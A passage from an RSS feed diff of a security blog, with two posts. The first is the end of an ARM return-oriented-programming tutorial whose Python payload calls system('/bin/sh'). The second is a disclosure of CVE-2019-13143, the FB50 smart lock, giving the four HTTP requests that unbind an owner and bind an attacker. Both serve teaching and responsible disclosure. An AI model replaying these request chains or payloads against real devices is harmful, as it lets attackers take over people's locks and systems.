+the address of &lt;code&gt;winner&lt;/code&gt;. Note the endianness.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ python -c &#x27;print(&quot;AAAABBBBCCCCDDDDEEEE\x28\x05\x01\x00&quot;)&#x27; | ./rop2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/python_winner_jump.png&quot; alt=&quot;jump to winner&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The reason we don’t jump to the first instruction is because we want to control the stack
+ourselves. If we allow &lt;code&gt;push {rll, lr}&lt;/code&gt; (first instruction) to occur, the program will &lt;code&gt;pop&lt;/code&gt;
+those out after &lt;code&gt;winner&lt;/code&gt; is done executing and we will no longer control 
+where it jumps to.&lt;/p&gt;
+
+&lt;p&gt;So that didn’t do much, just prints out a string “Nothing much here&amp;#8230;”. 
+But it &lt;em&gt;does&lt;/em&gt; however, contain &lt;code&gt;system()&lt;/code&gt;. Which somehow needs to be populated with an argument
+to do what we want (run a command, execute a shell, etc.).&lt;/p&gt;
+
+&lt;p&gt;To do that, we’ll follow a multi-step process: &lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Jump to the address of &lt;code&gt;gadget&lt;/code&gt;, again the 2nd instruction. This will &lt;code&gt;pop&lt;/code&gt; &lt;code&gt;r0&lt;/code&gt; and &lt;code&gt;pc&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Push our command to be executed, say “&lt;code&gt;/bin/sh&lt;/code&gt;” onto the stack. This will go into
+&lt;code&gt;r0&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Then, push the address of &lt;code&gt;system()&lt;/code&gt;. And this will go into &lt;code&gt;pc&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The pseudo-code is something like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;string = AAAABBBBCCCCDDDDEEEE
+gadget = # addr of gadget
+binsh  = # addr of /bin/sh
+system = # addr of system()
+
+print(string + gadget + binsh + system)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Clean and mean.&lt;/p&gt;
+
+&lt;h3 id=&quot;the-exploit&quot;&gt;The exploit&lt;/h3&gt;
+
+&lt;p&gt;To write the exploit, we’ll use Python and the absolute godsend of a library — &lt;code&gt;struct&lt;/code&gt;.
+It allows us to pack the bytes of addresses to the endianness of our choice.
+It probably does a lot more, but who cares.&lt;/p&gt;
+
+&lt;p&gt;Let’s start by fetching the address of &lt;code&gt;/bin/sh&lt;/code&gt;. In &lt;code&gt;gdb&lt;/code&gt;, set a breakpoint
+at &lt;code&gt;main&lt;/code&gt;, hit &lt;code&gt;r&lt;/code&gt; to run, and search the entire address space for the string “&lt;code&gt;/bin/sh&lt;/code&gt;”:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(gdb) find &amp;amp;system, +9999999, &quot;/bin/sh&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/gdb_find_binsh.png&quot; alt=&quot;gdb finding /bin/sh&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;One hit at &lt;code&gt;0xb6f85588&lt;/code&gt;. The addresses of &lt;code&gt;gadget&lt;/code&gt; and &lt;code&gt;system()&lt;/code&gt; can be
+found from the disassmblies from earlier. Here’s the final exploit code:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;import struct
+
+binsh = struct.pack(&quot;I&quot;, 0xb6f85588)
+string = &quot;AAAABBBBCCCCDDDDEEEE&quot;
+gadget = struct.pack(&quot;I&quot;, 0x00010550)
+system = struct.pack(&quot;I&quot;, 0x00010538)
+
+print(string + gadget + binsh + system)
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Honestly, not too far off from our pseudo-code :)&lt;/p&gt;
+
+&lt;p&gt;Let’s see it in action:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/the_shell.png&quot; alt=&quot;the shell!&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Notice that it doesn’t work the first time, and this is because &lt;code&gt;/bin/sh&lt;/code&gt; terminates
+when the pipe closes, since there’s no input coming in from STDIN.
+To get around this, we use &lt;code&gt;cat(1)&lt;/code&gt; which allows us to relay input through it
+to the shell. Nifty trick.&lt;/p&gt;
+
+&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;
+
+&lt;p&gt;This was a fairly basic challenge, with everything laid out conveniently. 
+Actual ropchaining is a little more involved, with a lot more gadgets to be chained
+to acheive code execution.&lt;/p&gt;
+
+&lt;p&gt;Hopefully, I’ll get around to writing about heap exploitation on ARM too. That’s all for now.&lt;/p&gt;
+</description>
+      <pubDate>Thu, 06 Jun 2019 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">https://icyphox.sh/blog/rop-on-arm/</guid>
+</item>
+<item>
+      <title>Picking the FB50 smart lock (CVE-2019-13143)</title>
+      <description>&lt;h1 id=&quot;picking-the-fb50-smart-lock-cve-2019-13143&quot;&gt;Picking the FB50 smart lock (CVE-2019-13143)&lt;/h1&gt;
+
+&lt;h2 id=&quot;and-lessons-learnt-in-iot-security&quot;&gt;… and lessons learnt in IoT security&lt;/h2&gt;
+
+&lt;p&gt;(&lt;em&gt;originally posted at &lt;a href=&quot;http://blog.securelayer7.net/fb50-smart-lock-vulnerability-disclosure&quot;&gt;SecureLayer7&amp;#8217;s Blog&lt;/a&gt;, with my edits&lt;/em&gt;)&lt;/p&gt;
+
+&lt;h3 id=&quot;the-lock&quot;&gt;The lock&lt;/h3&gt;
+
+&lt;p&gt;The lock in question is the FB50 smart lock, manufactured by Shenzhen
+Dragon Brother Technology Co. Ltd. This lock is sold under multiple brands
+across many ecommerce sites, and has over, an estimated, 15k+ users.&lt;/p&gt;
+
+&lt;p&gt;The lock pairs to a phone via Bluetooth, and requires the OKLOK app from
+the Play/App Store to function. The app requires the user to create an
+account before further functionality is available. 
+It also facilitates configuring the fingerprint,
+and unlocking from a range via Bluetooth.&lt;/p&gt;
+
+&lt;p&gt;We had two primary attack surfaces we decided to tackle — Bluetooth (BLE)
+and the Android app.&lt;/p&gt;
+
+&lt;h3 id=&quot;via-bluetooth-low-energy-ble&quot;&gt;Via Bluetooth Low Energy (BLE)&lt;/h3&gt;
+
+&lt;p&gt;Android phones have the ability to capture Bluetooth (HCI) traffic
+which can be enabled under Developer Options under Settings. We made 
+around 4 &amp;#8220;unlocks&amp;#8221; from the Android phone, as seen in the screenshot.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/bt_wireshark.png&quot; alt=&quot;wireshark packets&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This is the value sent in the &lt;code&gt;Write&lt;/code&gt; request:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/bt_ws_value.png&quot; alt=&quot;wireshark write req&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We attempted replaying these requests using &lt;code&gt;gattool&lt;/code&gt; and &lt;code&gt;gattacker&lt;/code&gt;,
+but that didn&amp;#8217;t pan out, since the value being written was encrypted.&lt;sup class=&quot;footnote-ref&quot; id=&quot;fnref-1&quot;&gt;&lt;a href=&quot;#fn-1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;via-the-android-app&quot;&gt;Via the Android app&lt;/h3&gt;
+
+&lt;p&gt;Reversing the app using &lt;code&gt;jd-gui&lt;/code&gt;, &lt;code&gt;apktool&lt;/code&gt; and &lt;code&gt;dex2jar&lt;/code&gt; didn&amp;#8217;t get us too
+far since most of it was obfuscated. Why bother when there exists an 
+easier approach &amp;#8211; BurpSuite.&lt;/p&gt;
+
+&lt;p&gt;We captured and played around with a bunch of requests and responses,
+and finally arrived at a working exploit chain.&lt;/p&gt;
+
+&lt;h3 id=&quot;the-exploit&quot;&gt;The exploit&lt;/h3&gt;
+
+&lt;p&gt;The entire exploit is a 4 step process consisting of authenticated 
+HTTP requests:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Using the lock&amp;#8217;s MAC (obtained via a simple Bluetooth scan in the 
+vicinity), get the barcode and lock ID&lt;/li&gt;
+&lt;li&gt;Using the barcode, fetch the user ID&lt;/li&gt;
+&lt;li&gt;Using the lock ID and user ID, unbind the user from the lock&lt;/li&gt;
+&lt;li&gt;Provide a new name, attacker&amp;#8217;s user ID and the MAC to bind the attacker
+to the lock&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;This is what it looks like, in essence (personal info redacted).&lt;/p&gt;
+
+&lt;h4 id=&quot;request-1&quot;&gt;Request 1&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;POST /oklock/lock/queryDevice
+{&quot;mac&quot;:&quot;XX:XX:XX:XX:XX:XX&quot;}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Response:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;{
+   &quot;result&quot;:{
+      &quot;alarm&quot;:0,
+      &quot;barcode&quot;:&quot;&amp;lt;BARCODE&amp;gt;&quot;,
+      &quot;chipType&quot;:&quot;1&quot;,
+      &quot;createAt&quot;:&quot;2019-05-14 09:32:23.0&quot;,
+      &quot;deviceId&quot;:&quot;&quot;,
+      &quot;electricity&quot;:&quot;95&quot;,
+      &quot;firmwareVersion&quot;:&quot;2.3&quot;,
+      &quot;gsmVersion&quot;:&quot;&quot;,
+      &quot;id&quot;:&amp;lt;LOCK ID&amp;gt;,
+      &quot;isLock&quot;:0,
+      &quot;lockKey&quot;:&quot;69,59,58,0,26,6,67,90,73,46,20,84,31,82,42,95&quot;,
+      &quot;lockPwd&quot;:&quot;000000&quot;,
+      &quot;mac&quot;:&quot;XX:XX:XX:XX:XX:XX&quot;,
+      &quot;name&quot;:&quot;lock&quot;,
+      &quot;radioName&quot;:&quot;BlueFPL&quot;,
+      &quot;type&quot;:0
+   },
+   &quot;status&quot;:&quot;2000&quot;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&quot;request-2&quot;&gt;Request 2&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;POST /oklock/lock/getDeviceInfo
+
+{&quot;barcode&quot;:&quot;https://app.oklok.com.cn/app.html?id=&amp;lt;BARCODE&amp;gt;&quot;}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Response:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;   &quot;result&quot;:{
+      &quot;account&quot;:&quot;email@some.website&quot;,
+      &quot;alarm&quot;:0,
+      &quot;barcode&quot;:&quot;&amp;lt;BARCODE&amp;gt;&quot;,
+      &quot;chipType&quot;:&quot;1&quot;,
+      &quot;createAt&quot;:&quot;2019-05-14 09:32:23.0&quot;,
+      &quot;deviceId&quot;:&quot;&quot;,
+      &quot;electricity&quot;:&quot;95&quot;,
+      &quot;firmwareVersion&quot;:&quot;2.3&quot;,
+      &quot;gsmVersion&quot;:&quot;&quot;,
+      &quot;id&quot;:&amp;lt;LOCK ID&amp;gt;,
+      &quot;isLock&quot;:0,
+      &quot;lockKey&quot;:&quot;69,59,58,0,26,6,67,90,73,46,20,84,31,82,42,95&quot;,
+      &quot;lockPwd&quot;:&quot;000000&quot;,
+      &quot;mac&quot;:&quot;XX:XX:XX:XX:XX:XX&quot;,
+      &quot;name&quot;:&quot;lock&quot;,
+      &quot;radioName&quot;:&quot;BlueFPL&quot;,
+      &quot;type&quot;:0,
+      &quot;userId&quot;:&amp;lt;USER ID&amp;gt;
+   }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&quot;request-3&quot;&gt;Request 3&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;POST /oklock/lock/unbind
+
+{&quot;lockId&quot;:&quot;&amp;lt;LOCK ID&amp;gt;&quot;,&quot;userId&quot;:&amp;lt;USER ID&amp;gt;}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&quot;request-4&quot;&gt;Request 4&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;POST /oklock/lock/bind
+
+{&quot;name&quot;:&quot;newname&quot;,&quot;userId&quot;:&amp;lt;USER ID&amp;gt;,&quot;mac&quot;:&quot;XX:XX:XX:XX:XX:XX&quot;}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;thats-it-the-scary-stuff&quot;&gt;That&amp;#8217;s it! (&amp;amp; the scary stuff)&lt;/h3&gt;
+
+&lt;p&gt;You should have the lock transferred to your account. The severity of this
+issue lies in the fact that the original owner completely loses access to
+their lock. They can&amp;#8217;t even &amp;#8220;rebind&amp;#8221; to get it back, since the current owner 
+(the attacker) needs to authorize that. &lt;/p&gt;
+
+&lt;p&gt;To add to that, roughly 15,000 user accounts&amp;#8217; info are exposed via IDOR.
+Ilja, a cool dude I met on Telegram, noticed locks named &amp;#8220;carlock&amp;#8221;, 
+&amp;#8220;garage&amp;#8221;, &amp;#8220;MainDoor&amp;#8221;, etc.&lt;sup class=&quot;footnote-ref&quot; id=&quot;fnref-2&quot;&gt;&lt;a href=&quot;#fn-2&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; This is terrifying.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;shudders&lt;/em&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;proof-of-concept&quot;&gt;Proof of Concept&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://twitter.com/icyphox/status/1158396372778807296&quot;&gt;PoC Video&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/icyphox/pwnfb50&quot;&gt;Exploit code&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;disclosure-timeline&quot;&gt;Disclosure timeline&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;26th June, 2019&lt;/strong&gt;: Issue discovered at SecureLayer7, Pune&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;27th June, 2019&lt;/strong&gt;: Vendor notified about the issue&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2nd July, 2019&lt;/strong&gt;: CVE-2019-13143 reserved&lt;/li&gt;
+&lt;li&gt;No response from vendor&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2nd August 2019&lt;/strong&gt;: Public disclosure&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;lessons-learnt&quot;&gt;Lessons learnt&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;DO NOT&lt;/strong&gt;. Ever. Buy. A smart lock. You&amp;#8217;re better off with the &amp;#8220;dumb&amp;#8221; ones
+with keys. With the IoT plague spreading, it brings in a large attack surface
+to things that were otherwise &amp;#8220;unhackable&amp;#8221; (try hacking a &amp;#8220;dumb&amp;#8221; toaster).&lt;/p&gt;
+
+&lt;p&gt;The IoT security scene is rife with bugs from over 10 years ago, like
+executable stack segments&lt;sup class=&quot;footnote-ref&quot; id=&quot;fnref-3&quot;&gt;&lt;a href=&quot;#fn-3&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;, hardcoded keys, and poor development 
+practices in general.&lt;/p&gt;
+
+&lt;p&gt;Our existing threat models and scenarios have to be updated to factor 
+in these new exploitation possibilities. This also broadens the playing 
+field for cyber warfare and mass surveillance campaigns. &lt;/p&gt;
+
+&lt;h3 id=&quot;researcher-info&quot;&gt;Researcher info&lt;/h3&gt;
+
+&lt;p&gt;This research was done at &lt;a href=&quot;https://securelayer7.net&quot;&gt;SecureLayer7&lt;/a&gt;, Pune, IN by:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Anirudh Oppiliappan (me)&lt;/li&gt;
+&lt;li&gt;S. Raghav Pillai (&lt;a href=&quot;https://twitter.com/_vologue&quot;&gt;@_vologue&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;Shubham Chougule (&lt;a href=&quot;https://twitter.com/shubhamtc&quot;&gt;@shubhamtc&lt;/a&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;footnotes&quot;&gt;
+&lt;hr /&gt;
+&lt;ol&gt;
+&lt;li id=&quot;fn-1&quot;&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.pentestpartners.com/security-blog/pwning-the-nokelock-api/&quot;&gt;This&lt;/a&gt; article discusses a similar smart lock, but they broke the encryption.&amp;#160;&lt;a href=&quot;#fnref-1&quot; class=&quot;footnoteBackLink&quot; title=&quot;Jump back to footnote 1 in the text.&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li id=&quot;fn-2&quot;&gt;
+&lt;p&gt;Thanks to Ilja Shaposhnikov (@drakylar).&amp;#160;&lt;a href=&quot;#fnref-2&quot; class=&quot;footnoteBackLink&quot; title=&quot;Jump back to footnote 2 in the text.&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li id=&quot;fn-3&quot;&gt;
+&lt;p&gt;&lt;a href=&quot;https://gsec.hitb.org/materials/sg2015/whitepapers/Lyon%20Yang%20-%20Advanced%20SOHO%20Router%20Exploitation.pdf&quot;&gt;PDF&lt;/a&gt;&amp;#160;&lt;a href=&quot;#fnref-3&quot; class=&quot;footnoteBackLink&quot; title=&quot;Jump back to footnote 3 in the text.&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;
+</description>
+      <pubDate>Mon, 05 Aug 2019 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">https://icyphox.sh/blog/fb50/</guid>
+</item>
+    </channel>
+</rss>
